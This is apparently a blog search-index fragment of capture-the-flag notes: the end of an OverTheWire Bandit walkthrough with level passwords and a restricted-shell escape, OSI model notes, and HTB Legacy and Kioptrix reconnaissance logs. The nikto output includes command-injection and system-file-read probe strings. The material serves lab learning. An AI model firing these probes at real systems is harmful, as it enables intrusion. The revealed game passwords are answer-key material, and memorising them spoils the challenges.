Name\u0026quot; to set your account's default identity. Omit --global to set the identity only in this repository. fatal: unable to auto-detect email address (got 'bandit26@bandit.(none)') bandit26@bandit:/tmp/giv_git/repo$ git config user.email \u0026quot;you@example.com\u0026quot; bandit26@bandit:/tmp/giv_git/repo$ git config user.name \u0026quot;you@example.com\u0026quot; bandit26@bandit:/tmp/giv_git/repo$ git commit -m \u0026quot;Added key.txt\u0026quot; [master 091067d] Added key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit26@bandit:/tmp/giv_git/repo$ git push The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Counting objects: 3, done. Delta compression using up to 4 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 317 bytes | 0 bytes/s, done. Total 3 (delta 0), reused 0 (delta 0) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -\u0026gt; master (pre-receive hook declined) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'  bandit 32 ssh bandit32@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit32@bandit.labs.overthewire.orgs password: WELCOME TO THE UPPERCASE SHELL \u0026gt;\u0026gt; $0 $ /bin/bash bandit33@bandit:~$ cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee  bandit 33 Not out yet.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/htb/",
	"title": "HTB",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer1/",
	"title": "Layer 1",
	"tags": ["OSI Model"],
	"description": "Transmission and reception of raw bit streams over a physical medium.",
	"content": "Layer 1          Num 1   Name Physical Layer   Acronim Please   PDU Bit   What is \u0026lsquo;on it\u0026rsquo; Data cables (CAT5e, CAT6), Terminations (RJ45,SFP), Hub, Repeater, Modem   Function Transmission and reception of raw bit streams over a physical medium    The lowest layer of the OSI reference model is the physical layer. It is responsible for the actual physical connection between the devices. The physical layer contains information in the form of bits. It is responsible for the actual physical connection between the devices. When receiving data, this layer will get the signal received and convert it into 0s and 1s and send them to the Data Link layer (layer 2), which will put the frame back together\n           0101 1001 0100 1110    The functions of the physical layer are :\n Bit synchronization: The physical layer provides the synchronization of the bits by providing a clock. This clock controls both sender and receiver thus providing synchronization at bit level. Bit rate control: The Physical layer also defines the transmission rate i.e. the number of bits sent per second. Physical topologies: Physical layer specifies the way in which the different, devices/nodes are arranged in a network i.e. bus, star or mesh topolgy. Transmission mode: Physical layer also defines the way in which the data flows between the two connected devices. The various transmission modes possible are: Simplex, half-duplex and full-duplex.  Physical Terminations "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer2/",
	"title": "Layer 2",
	"tags": ["OSI Model"],
	"description": "Reliable transmission of data frames between two nodes connected by a physical layer.",
	"content": "Layer 2          Num 2   Name Data link   Acronim Do   PDU Frame   What is \u0026lsquo;on it\u0026rsquo; NIC, Switch, Bridge   Function Reliable transmission of data frames between two nodes connected by a physical layer    The data link layer is responsible for the node to node delivery of the message. The main function of this layer is to make sure data transfer is error free from one node to another, over the physical layer. When a packet arrives in a network, it is the responsibility of the data link layer to transmit it to the Host using its MAC address. Data Link Layer is divided into two sub layers :\n Logical Link Control (LLC) Media Access Control (MAC)  The packet received from Network layer (layer 3) is further divided into frames depending on the frame size of NIC (Network Interface Card). The data link layer also encapsulates Sender and Receiver\u0026rsquo;s MAC address in the header.\nThe Receiver’s MAC address is obtained by placing an ARP(Address Resolution Protocol) request onto the wire asking \u0026ldquo;Who has that IP address?\u0026rdquo; and the destination host will reply with its MAC address.\nThe functions of the data Link layer are :\n Framing: Framing is a function of the data link layer. It provides a way for a sender to transmit a set of bits that are meaningful to the receiver. This can be accomplished by attaching special bit patterns to the beginning and end of the frame. Physical addressing: After creating frames, Data link layer adds physical addresses (MAC address) of sender and/or receiver in the header of each frame. Error control: Data link layer provides the mechanism of error control in which it detects and retransmits damaged or lost frames. Flow Control: The data rate must be constant on both sides else the data may get corrupted thus, flow control coordinates that amount of data that can be sent before receiving acknowledgement. Access control: When a single communication channel is shared by multiple devices, MAC sub-layer of data link layer helps to determine which device has control over the channel at a given time.  MAC Addresses First 3 pairs of MAC = Vendor.\nAlso called OUI.\nAlso see  OUI list Online lookup - macvendors  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer7/",
	"title": "Layer 7",
	"tags": ["OSI Model"],
	"description": "High-level APIs, including resource sharing, remote file access.",
	"content": "Layer7          Num 7   Name Application   Acronim Away   PDU    What is \u0026lsquo;on it\u0026rsquo; HTTP, SMTP, SMB   Function High-level APIs, including resource sharing, remote file access    At the very top of the OSI Reference Model stack of layers, we find Application layer which is implemented by the network applications. These applications produce the data, which has to be transferred over the network. This layer also serves as a window for the application services to access the network and for displaying the received information to the user.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/legacy/",
	"title": "Legacy",
	"tags": ["HTB"],
	"description": "Notes from the Legacy machine on HTB.",
	"content": "legacy where you at 10.10.10.4\nwhat you got nmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (2 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)   tcp_vuln.gnmap  (0 kb)   tcp_vuln.nmap  (0 kb)    # Nmap 7.80 scan initiated Thu Jan 23 14:44:54 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/legacy/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/legacy/scans/full_tcp.gnmap 10.10.10.4 Nmap scan report for 10.10.10.4 Host is up (0.020s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Device type: general purpose|specialized Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (87%) OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2 Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d00h58m20s, deviation: 1h24m51s, median: 4d23h58m20s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:3e:dd (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2020-01-28T17:44:54+02:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 19.92 ms 10.10.14.1 2 19.82 ms 10.10.10.4 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jan 23 14:47:24 2020 -- 1 IP address (1 host up) scanned in 150.89 seconds  Exploit SMB ms08_067_netapi\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/kioptrix/level1/",
	"title": "Level 1",
	"tags": ["VulnHub"],
	"description": "Notes from Kioptrix level 1 from Vulnhub.",
	"content": "level1    Proto port Service/URL Info Potential Vulns Verified Vulns     TCP 22 SSH OpenSSH 2.9p2 (protocol 1.99) ssh-hostkey 1024 Server supports SSHv1 old key exchange / ciphers : DH SHA1/AES128-CBC Off-By-One Kerberos 4 TGT/AFS Token Buffer Overflow    TCP 80,443 HTTP/S Apache httpd 1.3.20 PHP (4?) Unix Red-Hat/Linux mod_ssl/2.8.4 OpenSSL/0.9.6b SSLv2 Allowed methods: GET, HEAD, OPTIONS, TRACE No security headers configured HTTP-Title: Test Page for the Apache Web Server on Red Hat Linux Webalizer Version 2.01 (https://192.168.88.129/usage/) servername: kioptrix.level1 OpenFuck HTDigest Realm Command Line Argument Buffer Overflow Remote Users Disclosure mod_mylo Directory Index Disclosure Artificially Long Slash Path Directory Listing 1 Artificially Long Slash Path Directory Listing 3 Artificially Long Slash Path Directory Listing 4 PHP4 DROWN OpenFuck   TCP 111 rpcbind 2 (RPC #100000)     TCP 139 netbios-ssn Samba smbd 2.2.1a workgroup MYGROUP ADMIN$ no anon access IPC$ anon access trans2open trans2root sambal trans2open sambal   TCP 32768 RPCstatus 1 (RPC #100024)      Enum TCP nmap -T4 -p- -A 192.168.88.129  Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 23:00 CET Nmap scan report for 192.168.88.129 Host is up (0.00026s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux 111/tcp open rpcbind 2 (RPC #100000) 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: 400 Bad Request |_ssl-date: 2019-12-29T23:04:00+00:00; +1h01m51s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 |_ SSL2_DES_64_CBC_WITH_MD5 32768/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:CE:A7:CD (VMware) Device type: general purpose Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4 OS details: Linux 2.4.9 - 2.4.18 (likely embedded) Network Distance: 1 hop Host script results: |_clock-skew: 1h01m50s |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE HOP RTT ADDRESS 1 0.26 ms 192.168.88.129 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 131.55 seconds  UDP nmap -sU -T4 192.168.88.129  Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 23:07 CET Nmap scan report for 192.168.88.129 Host is up (0.00027s latency). Not shown: 950 closed ports, 48 open|filtered ports PORT STATE SERVICE 111/udp open rpcbind 137/udp open netbios-ns MAC Address: 00:0C:29:CE:A7:CD (VMware) Nmap done: 1 IP address (1 host up) scanned in 1027.39 seconds  192.168.88.129 - 80/443    Time URL Finding     2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Default webpage Apache PHP Red Hat   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Outdated software OpenSSL/0.9.6b Apache/1.3.20 mod_ssl/2.8.4   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/manual/index.html information disclousure Apache/1.3.20 Server at 127.0.0.1 Port 443   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ information disclousure Server may leak inodes via ETags, header found with file / inode: 34821, size: 2890, mtime: Thu Sep 6 05:12:46 2001   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Missing header The anti-clickjacking X-Frame-Options header is not present.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Missing header The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Missing header The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ Allowed HTTP Methods GET, HEAD, OPTIONS, TRACE   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-27487 Apache is vulnerable to XSS via the Expect header   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-838 Apache/1.3.20 Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-4552 Apache/1.3.20 Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-2733 Apache/1.3.20 Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-877 HTTP TRACE method is active, suggesting the host is vulnerable to XST   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-756 mod_ssl/2.8.4 mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/ OSVDB-877 HTTP TRACE method is active, suggesting the host is vulnerable to XST   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/usage/ OSVDB-682 Webalizer Version 2.01 Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/usage/ Information Disclousure kioptrix.level1   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/manual/ OSVDB-3268 /manual/: Directory indexing found.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/manual/ OSVDB-3092 Perl manual.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/icons/ OSVDB-3268 Directory indexing found.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/icons/ OSVDB-3233 /icons/README: Apache default file found.   2019-12-30 13:14:37 (GMT+1) https://192.168.88.129/test.php Custom test page \u0026lt;?php4 print \u0026quot;TEST\u0026quot;; ?\u0026gt;    Nikto nikto -h 192.168.88.129  - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.88.129 + Target Hostname: 192.168.88.129 + Target Port: 80 + Start Time: 2019-12-30 13:14:37 (GMT1) --------------------------------------------------------------------------- + Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b + Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep 6 05:12:46 2001 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + OSVDB-27487: Apache is vulnerable to XSS via the Expect header + mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version) + OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current. + Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392. + OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839. + OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542. + mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756. + Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL. + OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). + OSVDB-3268: /manual/: Directory indexing found. + OSVDB-3092: /manual/: Web server manual found. + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + OSVDB-3092: /test.php: This might be interesting... + /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found. + /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found. + /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution. + /shell?cat+/etc/hosts: A backdoor was identified. + 8724 requests: 0 error(s) and 30 item(s) reported on remote host + End Time: 2019-12-30 13:14:58 (GMT1) (21 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  dirbuster DirBuster 1.0-RC1 - Report http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project Report produced on Mon Dec 30 23:08:49 CET 2019 -------------------------------- http://192.168.88.129:80 -------------------------------- Directories found during testing: Dirs found with a 403 response: /cgi-bin/ /doc/ Dirs found with a 200 response: /icons/ / /manual/ /manual/mod/ /icons/small/ /usage/ /mrtg/ /manual/mod/mod_perl/ /manual/mod/mod_ssl/ -------------------------------- Files found during testing: Files found with a 200 responce: /test.php /usage/usage_201912.html /usage/usage_200909.html /mrtg/mrtg.html /mrtg/unix-guide.html /mrtg/nt-guide.html /mrtg/cfgmaker.html /mrtg/indexmaker.html /mrtg/reference.html /mrtg/faq.html /mrtg/forum.html /mrtg/contrib.html /mrtg/mrtg-rrd.html /mrtg/logfile.html /mrtg/mibhelp.html /mrtg/squid.html /mrtg/webserver.html /manual/mod/mod_ssl/ssl_overview.html /manual/mod/mod_ssl/index.html /manual/mod/mod_ssl/ssl_intro.html /manual/mod/mod_ssl/ssl_howto.html /manual/mod/mod_ssl/ssl_compat.html /manual/mod/mod_ssl/ssl_reference.html /manual/mod/mod_ssl/ssl_faq.html /manual/mod/mod_ssl/ssl_glossary.html --------------------------------  gobuster gobuster dir -u http://192.168.88.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -e  =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.88.129 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] Expanded: true [+] Timeout: 10s =============================================================== 2019/12/31 12:07:10 Starting gobuster =============================================================== http://192.168.88.129/index.html (Status: 200) http://192.168.88.129/test.php (Status: 200) http://192.168.88.129/manual (Status: 301) http://192.168.88.129/usage (Status: 301) http://192.168.88.129/mrtg (Status: 301) =============================================================== 2019/12/31 12:34:23 Finished ===============================================================  192.168.88.129 - 111/139    Time command/module Finding     2019-12-31 13:22:06 auxiliary(scanner/smb/smb_version) Samba 2.2.1a   2019-12-31 13:35:59 nmap/smbclient NetBIOS KIOPTRIX   2019-12-31 13:35:59 nmap/smbclient workgroup MYGROUP   2019-12-31 13:35:59 smbclient ADMIN$ no anon acces   2019-12-31 13:35:59 smbclient IPC$ no anon acces    MSF msf5 auxiliary(scanner/smb/smb_version)  [*] 192.168.88.129:139 - Host could not be identified: Unix (Samba 2.2.1a) [*] 192.168.88.129:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  smbclient smbclient -L \\\\\\\\192.168.88.129\\\\  Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set Anonymous login successful Enter WORKGROUP\\root's password: Sharename Type Comment --------- ---- ------- IPC$ IPC IPC Service (Samba Server) ADMIN$ IPC IPC Service (Samba Server) Reconnecting with SMB1 for workgroup listing. Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set Anonymous login successful Server Comment --------- ------- KIOPTRIX Samba Server Workgroup Master --------- ------- MYGROUP  smbclient \\\\\\\\192.168.88.129\\\\ADMIN$  Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set Anonymous login successful Enter WORKGROUP\\root's password: tree connect failed: NT_STATUS_WRONG_PASSWORD  smbclient \\\\\\\\192.168.88.129\\\\IPC$  Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set Anonymous login successful Enter WORKGROUP\\root's password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; help ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\\u0026gt; ls NT_STATUS_NETWORK_ACCESS_DENIED listing \\* smb: \\\u0026gt;  Enum4Linux enum4linux -a 192.168.88.129  Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 2 16:24:28 2020 ========================== | Target Information | ========================== Target ........... 192.168.88.129 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================== | Enumerating Workgroup/Domain on 192.168.88.129 | ====================================================== [+] Got domain/workgroup name: MYGROUP ============================================== | Nbtstat Information for 192.168.88.129 | ============================================== Looking up status of 192.168.88.129 KIOPTRIX \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service KIOPTRIX \u0026lt;03\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Messenger Service KIOPTRIX \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser MYGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name MYGROUP \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser MYGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ======================================= | Session Check on 192.168.88.129 | ======================================= [+] Server 192.168.88.129 allows sessions using username '', password '' ============================================= | Getting domain SID for 192.168.88.129 | ============================================= Domain Name: MYGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ======================================== | OS information on 192.168.88.129 | ======================================== Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for 192.168.88.129 from smbclient: [+] Got OS info for 192.168.88.129 from srvinfo: KIOPTRIX Wk Sv PrQ Unx NT SNT Samba Server platform_id : 500 os version : 4.5 server type : 0x9a03 =============================== | Users on 192.168.88.129 | =============================== Use of uninitialized value $users in print at ./enum4linux.pl line 874. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877. Use of uninitialized value $users in print at ./enum4linux.pl line 888. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890. =========================================== | Share Enumeration on 192.168.88.129 | =========================================== Sharename Type Comment --------- ---- ------- IPC$ IPC IPC Service (Samba Server) ADMIN$ IPC IPC Service (Samba Server) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- KIOPTRIX Samba Server Workgroup Master --------- ------- MYGROUP KIOPTRIX [+] Attempting to map shares on 192.168.88.129 //192.168.88.129/IPC$ [E] Can't understand response: NT_STATUS_NETWORK_ACCESS_DENIED listing \\* //192.168.88.129/ADMIN$ [E] Can't understand response: tree connect failed: NT_STATUS_WRONG_PASSWORD ====================================================== | Password Policy Information for 192.168.88.129 | ====================================================== [E] Unexpected error from polenum: [+] Attaching to 192.168.88.129 using a NULL share [+] Trying protocol 445/SMB... [!] Protocol failed: [Errno Connection error (192.168.88.129:445)] [Errno 111] Connection refused [+] Trying protocol 139/SMB... [!] Protocol failed: SMB SessionError: 0x5 [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 0 ================================ | Groups on 192.168.88.129 | ================================ [+] Getting builtin groups: group:[Administrators] rid:[0x220] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Power Users] rid:[0x223] group:[Account Operators] rid:[0x224] group:[System Operators] rid:[0x225] group:[Print Operators] rid:[0x226] group:[Backup Operators] rid:[0x227] group:[Replicator] rid:[0x228] [+] Getting builtin group memberships: Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator Group 'Guests' (RID: 546) has member: Couldn't find group Guests Group 'Users' (RID: 545) has member: Couldn't find group Users Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users [+] Getting local groups: group:[sys] rid:[0x3ef] group:[tty] rid:[0x3f3] group:[disk] rid:[0x3f5] group:[mem] rid:[0x3f9] group:[kmem] rid:[0x3fb] group:[wheel] rid:[0x3fd] group:[man] rid:[0x407] group:[dip] rid:[0x439] group:[lock] rid:[0x455] group:[users] rid:[0x4b1] group:[slocate] rid:[0x413] group:[floppy] rid:[0x40f] group:[utmp] rid:[0x415] [+] Getting local group memberships: [+] Getting domain groups: group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] [+] Getting domain group memberships: Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins ========================================================================= | Users on 192.168.88.129 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================= [I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623 [+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password '' S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\\ (0) S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\\ (0) S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\\unix_group.2147483399 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\\unix_group.2147483399 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\\unix_group.2147483400 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\\unix_group.2147483400 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\\unix_group.2147483401 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\\unix_group.2147483401 (Local Group) 